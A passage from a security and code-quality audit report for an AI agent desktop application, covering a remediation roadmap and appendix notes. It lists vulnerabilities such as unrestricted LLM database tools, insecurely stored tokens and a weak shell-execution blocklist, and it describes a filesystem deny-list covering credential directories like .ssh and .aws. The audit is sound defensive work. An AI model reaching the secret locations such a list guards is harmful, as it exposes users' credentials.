| Build/DevOps | C | CI exists and runs clippy/tsc; release.yml unsigned; toolchain split; devtools in prod | `.github/workflows/` |

---

## REMEDIATION ROADMAP

### Week 1 — Critical Security Fixes (Production-Blocking)

**Day 1–2 (Security-critical, quick wins):**
- [x] CRIT-008: Extension `javascript:` URI check (5 min)
- [x] CRIT-009: ArtifactPreview sanitizeHtml (2 min)
- [x] CRIT-012: Remove devtools from default features (2 min)
- [x] CRIT-011: Fix release.yml Apple signing (10 min)
- [x] HIGH-012: Add secret masking to release.yml (5 min)

**Day 3–5 (Data/auth security):**
- [ ] CRIT-001: Add table whitelist to LLM db_query/db_execute tools
- [ ] CRIT-002: Validate MySQL procedure name identifier
- [ ] CRIT-003: Remove PII from authCoreStore localStorage persistence
- [ ] CRIT-004: Remove chrome.storage.local fallback for API keys
- [ ] CRIT-005: Remove MMKV fallback for Supabase auth tokens

### Week 2 — High Issues (Stability & Correctness)

- [ ] CRIT-006: Register 27 unregistered Rust commands in generate_handler![]
- [ ] CRIT-007: Fix mcp_oauth.rs startup panic
- [ ] CRIT-010: Add validation to agent/executor.rs process spawning
- [ ] HIGH-001: Add zero-vector guard to embedding storage
- [ ] HIGH-002: Improve shell execution security (terminal_executor blocklist)
- [ ] HIGH-003: Audit osascript call sites in window_manager.rs
- [ ] HIGH-008: Remove reqwest `blocking` feature
- [ ] HIGH-009: Unify Rust toolchain to 1.94.0 across all files
- [ ] HIGH-014: Add 4 FTS sync trigger sets
- [ ] HIGH-015: Remove remote-databases from default features
- [ ] HIGH-016: Add missing tables to ALLOWED_TABLES

### Week 3 — Medium Issues (Quality & SDLC)

- [ ] MED-002: Implement unified AppError type
- [ ] MED-003: Consolidate feature flags into featureFlagStore
- [ ] MED-004: Add ErrorBoundaries to billing/media/connectors/chat pages
- [ ] MED-005: Move sync_queue into main migration chain
- [ ] MED-006: Fix permissions DROP TABLE data loss in migration v40
- [ ] MED-007: Replace CSP `unsafe-inline` with nonces
- [ ] MED-011: Make critical CVE audit blocking in CI
- [ ] MED-012: Add macOS + Windows to CI test matrix
- [ ] MED-014: Delete 8 dead components

### Week 4+ — Feature Completion & Long-term

- [ ] HIGH-007: Migrate AGI core Mutex to tokio::sync::Mutex
- [ ] MED-001: Update AGI planner to use claude-sonnet-4-6
- [ ] MED-016: Enumerate specific tokio features needed
- [ ] Feature: Add cloud embedding API fallback (Voyage, OpenAI) when Ollama unavailable
- [ ] Feature: Persist Computer Use sessions to SQLite for history/replay
- [ ] Feature: Confirm tool_result Anthropic-format feedback in AGI planning loop
- [ ] Feature: Implement desktop↔mobile sync protocol
- [ ] Feature: Add Apple Calendar implementation (currently a type stub)
- [ ] Testing: Add unit tests for computer_use, calendar, scheduler command handlers

---

## APPENDIX: Additional Notes

### IPC Convention Note
The audit prompt stated "Tauri 2.x auto-converts snake_case Rust fn names to camelCase in TypeScript." This is **incorrect**. Verified against `@tauri-apps/api@2.10.1` source (`node_modules/@tauri-apps/api/core.js:201`): Tauri 2.x passes command strings as-is with zero conversion. All 517 frontend `invoke()` calls correctly use snake_case matching Rust function names. There are **zero IPC naming violations** in this codebase.

### AGI Tool-Result Feedback
The AGI planning loop stores tool results in `context.tool_results` (Vec) and accumulates context memory, but the exact mechanism by which prior tool results are serialized into the next LLM prompt was not confirmed in `core.rs` alone — this requires reading `planner.rs` and `reflection.rs` context construction code. The chat path (`managed_cloud_provider.rs:411–413`) correctly constructs Anthropic `tool_result` blocks. These are architecturally separate systems.

### Positive Findings Worth Noting
- Rust JWT tokens stored **in-memory only** (never to disk) — correct implementation (`sys/account/mod.rs:384`)
- MCP credentials use AES-256-GCM encryption (`mcp/config.rs:829`) — correct
- `unsafe_code = "deny"` enforced at workspace level (`Cargo.toml:10`) — excellent security hygiene
- PKCE OAuth flow implemented for Google Calendar (`features/calendar/google_calendar.rs`) — correct
- `$SESSION_COST_SAFETY_CAP = $50.0` prevents runaway LLM cost (`llm_router.rs`)
- Full blocklist deny-list for filesystem access in capabilities JSON covering `.aws`, `.ssh`, `.gnupg`, `.kube`, `.npmrc`, etc.
- Zero `.backup` file pollution in source tree
- TypeScript: Zero compilation errors in both `apps/desktop` and `apps/web`

---

*End of AGI Workforce Audit Report — All zones complete*  
*ZONE A (Frontend) · ZONE B (Rust Backend) · ZONE C (Database) · ZONE D (Integration/Security) · ZONE E (DevOps) · ZONE F (Features/SDLC)*
